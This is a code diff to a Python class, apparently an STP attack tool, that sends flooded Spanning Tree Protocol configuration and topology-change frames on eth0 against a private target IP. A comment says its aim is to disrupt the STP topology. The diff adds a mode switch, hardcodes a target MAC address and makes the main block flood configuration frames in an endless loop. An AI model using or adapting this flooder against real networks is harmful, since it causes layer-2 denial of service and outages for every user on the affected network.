@@ -13,6 +13,7 @@ class stplib:
 	def __init__(self,target_ip):
 		self.target_ip=target_ip
 		self.target_mac=getmacbyip(target_ip)
+		self.target_mac="aa:bb:cc:80:01:00"
 		self.host_ip=get_ip_address('eth0')
 		self.host_mac=get_mac_address()
 	def run_tcnflood(self):#rao luan stp topology
@@ -32,16 +33,19 @@ class stplib:
 		packet=eth/llc/stp
 		sendp(packet,iface='eth0')
 
-	def run(self):
+	def run(self,mode):
 		while True:
-			self.run_confflood()
-			self.run_tcnflood()
+			if mode==0:
+				self.run_confflood()
+			if mode==1:
+				self.run_tcnflood()
 
 
 
 if __name__=='__main__':
-	a=stplib("192.168.237.66")
+	a=stplib("192.168.237.11")
 	#a.run_tcnflood()
-	a.run_confflood()
+	while True:
+		a.run_confflood()
 
 
